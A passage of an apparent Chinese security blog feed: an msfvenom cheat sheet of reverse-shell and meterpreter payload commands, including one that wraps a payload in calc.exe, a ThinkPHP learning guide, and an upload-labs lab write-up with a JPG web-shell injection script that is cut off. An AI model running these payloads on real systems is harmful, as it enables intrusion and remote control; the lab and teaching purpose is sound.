class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure></p><p>Bash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure></p><p>Perl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure></p><p>Linux Based Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure></p><p>Windows Based Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure></p><p>Mac Based Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br><span class="line">Handlers</span><br></pre></td></tr></table></figure></p><h4 id="自选模块"><a href="#自选模块" class="headerlink" title="自选模块"></a>自选模块</h4><p>生成执行计算器payload例子:</p><blockquote><p>   msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; 1.exe</p></blockquote><h4 id="友情链接"><a href="#友情链接" class="headerlink" title="友情链接"></a>友情链接</h4><p>查资料的时候发现这位大佬总结的特别好，还想深入了解metasploit直接<a href="https://thief.one/2017/08/01/1/" target="_blank" rel="noopener">传送门</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://xz.aliyun.com/t/2381" target="_blank" rel="noopener">https://xz.aliyun.com/t/2381</a><br><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a><br><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/msfvenom/</a><br><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</a><br><a href="https://xz.aliyun.com/t/2380" target="_blank" rel="noopener">https://xz.aliyun.com/t/2380</a><br><a href="https://thief.one/2017/08/01/1/" target="_blank" rel="noopener">https://thief.one/2017/08/01/1/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      如何使用metasploit构造shell脚本
    
    </summary>
    
      <category term="工具" scheme="https://museljh.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Matesploit" scheme="https://museljh.github.io/tags/Matesploit/"/>
    
  </entry>
  
  <entry>
    <title>从零开始学习PHP框架之ThinkPHP</title>
    <link href="https://museljh.github.io/2019/02/17/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0PHP%E6%A1%86%E6%9E%B6%E4%B9%8BThinkPHP/"/>
    <id>https://museljh.github.io/2019/02/17/从零开始学习PHP框架之ThinkPHP/</id>
    <published>2019-02-17T13:39:39.000Z</published>
    <updated>2019-02-17T13:51:32.301Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在大多数PHP项目都是基于框架进行开发的，所以学习PHP框架最了解PHP编写web应用程序有着十分重要的作用，也能让我们不仅仅从局部角度去思考一个漏洞为什么产生，而能够让我们以一种全局的眼观看待一个漏洞产生的始末。本文也主要是讲解如何熟练上手PHP框架。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="一、PHP框架的简要介绍"><a href="#一、PHP框架的简要介绍" class="headerlink" title="一、PHP框架的简要介绍"></a>一、PHP框架的简要介绍</h3><p>形象的来说，PHP框架 把 PHP 程序开发摆到了流水线上。换句话说，PHP开发框架有助于促进快速软件开发（RAD），这节约了你的时间，有助于创建更为稳定的程序，并减少开发者的重复编写代码的劳动。<br>我们通常认为PHP框架的作用相当于模型-视图-控制器（Model View<br>Controller）。MVC是种编程的架构模式，将业务逻辑从UI中分离出来，允许一个一个单独修改。它隔离了业务逻辑与 UI，允许其一改变而另一者不受影响；在 MVC 中，模型负责数据，视图负责表现，控制器则是程序主体或者说是负责业务逻辑。从本质上说，MVC 拆分了一个程序的开发过程，这样你就可以修改独立的每一部分，而其他部分不受影响。这是十分重要的，它使得编写 PHP 代码更为快捷简单。<br>PHP框架 已经对常见的安全性如表单检测、SQL注入等常见的安全问题做了一定的内置处理。当然，不是用上 PHP 就绝对安全了，最重要的还是要程序开发人员自己有安全意识与经验。</p><h3 id="二、php常见框架"><a href="#二、php常见框架" class="headerlink" title="二、php常见框架"></a>二、php常见框架</h3><p>在Github上搜索PHP<br><img src="https://i.imgur.com/NhuUm1c.png" alt=""><br><img src="https://i.imgur.com/7cvJJLQ.png" alt=""><br>在过去几年中，Lavarel有很明显的优势一直处在最热门PHP框架的冠军位置，同样在2019年也是如此，在Github star数甚至是第二名的差不多2.5倍可见它的受欢迎程度。当然常见框架除了laravel还有symfony、CodeIgniter、yii2、cakephp、ZendFramework当然还有国产的THinkPHP，<br>在谷歌走势图中<br><img src="https://i.imgur.com/A72fBJf.png" alt=""><br>laravel在世界始终是排名第一，并且远远超过其他<br>但是在中国PHP框架使用最多的却是yii这里并不包括thinkphp<br><img src="https://i.imgur.com/VijZmEt.png" alt=""><br>具体原因很多，主要原因可能是国内还需要科学上网的原因？或者是laravel学习门槛要比ThinkPHP高很多的原因。反正原因很多，<br>在中国还是thinkPHP以及yii2比较流行</p><h3 id="三、如何上手一个新的框架"><a href="#三、如何上手一个新的框架" class="headerlink" title="三、如何上手一个新的框架"></a>三、如何上手一个新的框架</h3><p>如今的PHP框架层出不穷，我该如何才能更快地开始使用某个新的框架呢?最简单的方式就是练习几个简单的demo来熟悉这个框架<br>1、你好世界（hello world）<br>这里练习的必要性我就不多作说明了。在一个新的框架上构建一个应用，在页面中显示“‘hello world”。当然，做起来不会那么简单。</p><p>2、计算器（calculator）<br>写一个简单的计算器程序，结合表单，对两个操作数进行加减乘除等运算，并把结果输出到页面上。你需要为每一种运算设置单独的动作，或者说方法（每个框架的叫法不一样），而且还要用到框架中的表单验证功能（如果框架提供了这一功能的话）。</p><p>3、留言板（guestbook）<br>让我们回到1998年——建立一个留言本程序，在页面上显示一个表单让用户填写，然后提交到这个应用程序里，继而存储到数据库或文本文件中（视你自己的情况而定），并把用户留言的内容显示到页面上。如果框架提供了创建HTML表单、对象模型或层等功能，就用上它们吧。</p><p>4、解析和分页（parse and paginate）<br>选一个RSS源或其他XML源，解析其中的条目并显示出来。同时添加一个分页的功能，让用户可以五条五条地浏览，并在页面的顶部或底部添加页码。如果框架里提供了这样的功能，就使用它吧。</p><p>完成以上的练习后，你应该就可以清楚地知道如何使用这个框架了，并能用它完成更复杂的工作，或是继续探索这个框架的其他功能。如果你还是不会用，或者花了很多时间来完成以上练习，那么我觉得这个框架不适合你，还是找些其他的来用吧。</p><p>记住，如果在使用框架的过程中遇到困难，记得去该框架的社区里寻求帮助。一个有这强大社区支持的框架会为你未来的工作带来很大帮助，同时也表明这个框架是个不错的框架。没有人希望在使用某框架后的六个月，框架的开发者就宣布停止开发，这就太气人了。</p><h3 id="四、开发环境搭建"><a href="#四、开发环境搭建" class="headerlink" title="四、开发环境搭建"></a>四、开发环境搭建</h3><p>环境：Visual Studio Code<br>     PHPstudy<br>     xdebug<br>     <a href="https://zhuanlan.zhihu.com/p/25844268" target="_blank" rel="noopener">用Visual Studio Code Debug世界上最好语言</a></p><h3 id="五、thinkPHP"><a href="#五、thinkPHP" class="headerlink" title="五、thinkPHP"></a>五、thinkPHP</h3><p>毕竟thinkPHP可以说是在中国最受欢迎的PHP框架所以我们首先学习它.</p><h4 id="1、thinkPHP简介"><a href="#1、thinkPHP简介" class="headerlink" title="1、thinkPHP简介"></a>1、thinkPHP简介</h4><p>ThinkPHP(FCS)是一个轻量级的中型框架，是从Java的Struts结构移植过来的中文PHP开发框架。它使用面向对象的开发结构和MVC模式，并且模拟实现了Struts的标签库，各方面都比较人性化，熟悉J2EE的开发人员相对比较容易上手，适合php框架初学者。 ThinkPHP的宗旨是简化开发、提高效率、易于扩展，其在对数据库的支持方面已经包括MySQL、MSSQL、Sqlite、PgSQL、 Oracle，以及PDO的支持。ThinkPHP有着丰富的文档和示例，框架的兼容性较强，但是其功能有限，因此更适合用于中小项目的开发。</p><p>优点：</p><p>1.易于上手，有丰富的中文文档；</p><p>2.框架的兼容性较强，PHP4和PHP5完全兼容、完全支持UTF8等。</p><ol start="3"><li>适合用于中小项目的开发</li></ol><p>缺点：</p><p>1.对Ajax的支持不是很好；</p><p>2.目录结构混乱，需要花时间整理；</p><p>3.上手容易，但是深入学习较难。</p><h4 id="1、基于ThinkPHP输出hello-world"><a href="#1、基于ThinkPHP输出hello-world" class="headerlink" title="1、基于ThinkPHP输出hello world"></a>1、基于ThinkPHP输出hello world</h4><p>零基础的化直接看<a href="https://www.kancloud.cn/yunzhiclub/thinkphp5guide/164724" target="_blank" rel="noopener">ThinkPHP5入门实例教程</a><br>想较为深入了解的话可以看官方的开发手册<a href="https://www.kancloud.cn/manual/thinkphp5/118007" target="_blank" rel="noopener">ThinkPHP5完全开发手册</a><br>几个注意事项</p><blockquote><p>1.ThinkPHP完整版和核心版区别在于:完整版比核心版多了很多扩展插件，而核心版只有核心函数</p></blockquote><h4 id="2、基于ThinkPHP的教师管理"><a href="#2、基于ThinkPHP的教师管理" class="headerlink" title="2、基于ThinkPHP的教师管理"></a>2、基于ThinkPHP的教师管理</h4><p>加深下印象<a href="https://www.kancloud.cn/yunzhiclub/thinkphp5guide/164724" target="_blank" rel="noopener">ThinkPHP5入门实例教程</a><br><a href="https://blog.csdn.net/WYpersist/article/details/79834490" target="_blank" rel="noopener">Navicat for MySQL 安装和破解（完美)</a></p><h4 id="3、深入"><a href="#3、深入" class="headerlink" title="3、深入"></a>3、深入</h4><p>如果还想继续了解ThinKPHP的话继续看ThinkPHP5入门实例教程就好了。当然如果想对ThinkPHP整体有着深入了解的话可以去专研ThinkPHP5完全开发手册</p><h3 id="3-ThinkPHP安全"><a href="#3-ThinkPHP安全" class="headerlink" title="3.ThinkPHP安全"></a>3.ThinkPHP安全</h3><h4 id="1-输入安全"><a href="#1-输入安全" class="headerlink" title="1.输入安全"></a>1.输入安全</h4><p>永远不要相信用户提交的数据，建议务必遵守下面规则：<br>设置public目录为唯一对外访问目录，不要把资源文件放入应用目录；<br>开启表单令牌验证避免数据的重复提交，能起到CSRF防御作用；<br>使用框架提供的请求变量获取方法（Request类param方法及input助手函数）而不是原生系统变量获取用户输入数据；<br>对不同的应用需求设置default_filter过滤规则（默认没有任何过滤规则），常见的安全过滤函数包括stripslashes、htmlentities、htmlspecialchars和strip_tags等，请根据业务场景选择最合适的过滤方法；<br>使用验证类或者验证方法对业务数据设置必要的验证规则；<br>如果可能开启强制路由或者设置MISS路由规则，严格规范每个URL请求；</p><h4 id="2-数据库安全"><a href="#2-数据库安全" class="headerlink" title="2.数据库安全"></a>2.数据库安全</h4><p>尽量少使用数组查询条件而应该使用查询表达式替代；<br>尽量少使用字符串查询条件，如果不得已的情况下 使用手动参数绑定功能；<br>不要让用户输入决定要查询或者写入的字段；<br>对于敏感数据在输出的时候使用hidden方法进行隐藏；<br>对于数据的写入操作应当做好权限检查工作；<br>写入数据严格使用field方法限制写入字段；<br>对于需要输出到页面的数据做好必要的XSS过滤；</p><h4 id="3-上传安全"><a href="#3-上传安全" class="headerlink" title="3.上传安全"></a>3.上传安全</h4><p>统的think\File提供了文件上传的安全支持，包括对文件后缀、文件类型、文件大小以及上传图片文件的合法性检查，确保你已经在上传操作中启用了这些合法性检查。</p><p>为了方便版本升级，并且保证public目录为唯一的web可访问目录，资源文件可以放到项目之外，例如项目目录为</p><blockquote><p>/home/www/thinkphp/</p></blockquote><p>那么资源目录、上传文件保存的目录</p><blockquote><p>/home/www/resource/<br>/home/www/resource/upload/</p></blockquote><p>为了项目的可维护性，目录操作最好不超出本项目的根目录，所以需要把resource目录映射到根目录</p><blockquote><p>ln -s /home/www/resource/  /home/www/thinkphp/resource/</p></blockquote><p>如果上传文件也需要web访问，可以生成一个软连接到public</p><blockquote><p>ln -s /home/www/thinkphp/resource/upload/  /home/www/thinkphp/public/upload/</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://my.oschina.net/justjavac/blog/70393" target="_blank" rel="noopener">https://my.oschina.net/justjavac/blog/70393</a><br><a href="https://blog.csdn.net/qq_16030133/article/details/81067544" target="_blank" rel="noopener">https://blog.csdn.net/qq_16030133/article/details/81067544</a><br><a href="http://www.devacg.com/?post=842" target="_blank" rel="noopener">http://www.devacg.com/?post=842</a><br><a href="https://blog.csdn.net/Vezn_King/article/details/75453717" target="_blank" rel="noopener">https://blog.csdn.net/Vezn_King/article/details/75453717</a><br><a href="https://zhuanlan.zhihu.com/p/25844268" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25844268</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      从开发环境，到代码调试，再到搭建自己的基于Thinkphp小demo，一切从零开始
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="php框架" scheme="https://museljh.github.io/tags/php%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs-writeup 16~20</title>
    <link href="https://museljh.github.io/2019/02/16/upload-labs-writeup%2016~20/"/>
    <id>https://museljh.github.io/2019/02/16/upload-labs-writeup 16~20/</id>
    <published>2019-02-16T15:34:26.000Z</published>
    <updated>2019-02-16T15:43:25.597Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>upload-labs是一个基于php语言的上传漏洞的靶场项目包括(最新commit17ec936) 的19个上传关卡的方法。可以通过git clone <a href="https://github.com/c0ny1/upload-labs.git" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs.git</a> 来搭建属于自己的一个upload练习靶场</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><img src="https://i.imgur.com/hiUxIwF.png" alt=""></p><h3 id="Pass-016-二次渲染绕过"><a href="#Pass-016-二次渲染绕过" class="headerlink" title="Pass-016  二次渲染绕过"></a>Pass-016  二次渲染绕过</h3><p>先看下源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">    $filetype = $_FILES[&apos;upload_file&apos;][&apos;type&apos;];</span><br><span class="line">    $tmpname = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.&apos;/&apos;.basename($filename);</span><br><span class="line"></span><br><span class="line">    // 获得上传文件的扩展名</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&apos;/&apos;.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&apos;/&apos;.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&apos;/&apos;.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这是基于白名单的过滤<br>这次的判断不仅仅是判断文件后缀，还要判断文件是要对于类型的，<br>感觉图片🐎依旧是能够绕过，（什么是图片🐎可以看之前文章）<br>尝试下<br><img src="https://i.imgur.com/h4aiwnt.png" alt=""><br>？？？<br>那么<br><img src="https://i.imgur.com/8AwsxIK.png" alt=""><br>这个又是神马用处？？？<br>但是用winhex打开图片🐎，拉到最下面<br><img src="https://i.imgur.com/n00u5cD.png" alt=""><br>我的🐎呢？？？？<br>🐎跑哪里去了？？？<br>原来这关里用到了php的imagecreatefromjpeg、imagecreatefrompng、imagecreatefromgif这几个图片处理函数对上传的图片进行了二次渲染生成了新的图片，所以如果在这里上传的是一个普通的图片马，虽然图片马可以上传成功，但是上传的图片马在经过二次渲染后，imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。图片尾部的php代码就会被删除掉，所以在这里不能使用直接在图片尾部添加一句话木马的方式去合成图片马。<br>原来如此，斗气化🐎也不是万能的，<br>那么我们如何绕过呢？<br>这里又一个非常明显的逻辑错误<br>这里首先<br><img src="https://i.imgur.com/GVNP8Gc.png" alt=""><br>当这个图片🐎不是真正图片的时候它就不会进行二次渲染<br>那么我们直接将PHP文件改成JPG形式的🐎就可以绕过了。<br>我们尝试下<br><img src="https://i.imgur.com/v9hDCmw.png" alt=""><br>但是其实已经上传成功了，然鹅这只是我们想想而已如果判断错误会有个unlink函数，直接将我们上传的图片删除了<br>那么我们该如何绕过呢？<br>我们先将php的代码放在中间<br><img src="https://i.imgur.com/dMXIn65.png" alt=""><br>失败，<br>具体可以看<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">这里</a></p><p>这里采取国外大牛的一个脚本，将jpg改成图片🐎绕过二次渲染限制<br><a href="http://link.zhihu.com/?target=https%3A//secgeek.net/bookfresh-vulnerability/" target="_blank" rel="noopener">国外大牛</a>，有兴趣的可以点这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">    1) Upload an arbitrary image via secured files upload script</span><br><span class="line">    2) Save the processed image and launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;.</span><br><span class="line">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) &#123;</span><br><span class="line">        die(&apos;php-gd is not installed&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = 